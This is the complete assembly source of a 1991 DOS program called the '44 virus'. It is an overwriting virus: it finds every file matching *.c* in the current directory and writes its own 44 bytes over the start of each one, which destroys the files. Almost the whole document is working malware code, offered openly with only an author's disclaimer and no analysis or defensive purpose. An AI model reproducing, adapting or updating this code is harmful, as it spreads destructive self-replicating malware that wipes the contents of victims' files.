;******************************************************************************
;*  44-virus  version 1.0
;* 
;*  Assemble with Tasm 1.01
;*  
;*  The 44 virus is a non-resident overwriting virus with a lenght 
;*  of 44 bytes. It will infect all files with the extension .C* 
;*  in the current directory.   
;*   
;*  (c) 1991 Dark Helmet
;*  
;*  The author is not responsible for any damage caused by the virus
;*  
;******************************************************************************

virus      segment
           org  100h
           assume cs:virus

len        equ offset last-100h

start:     mov ah,04eh          ; Search first file with extension .c*
           xor cx,cx            ; Only normal files
           lea dx,com_mask      ; 
           int 21h              
                      
open_file: mov ax,3d02h         ; open file for read/write
           mov dx,9eh           
           int 21h

Infect:    mov cx,len           ; Write virus to start of file
           lea dx,start          
           mov ah,40h           
           int 21h
           
Next:      mov ah,3eh           ; Close file
           int 21h             
           mov ah,4fh           ; Search next file
           int 21h           
           jnb open_file        ; Are there any files left?

com_mask:  db "*.c*",0           ; mask
last:      db 090h

virus ends
      end start

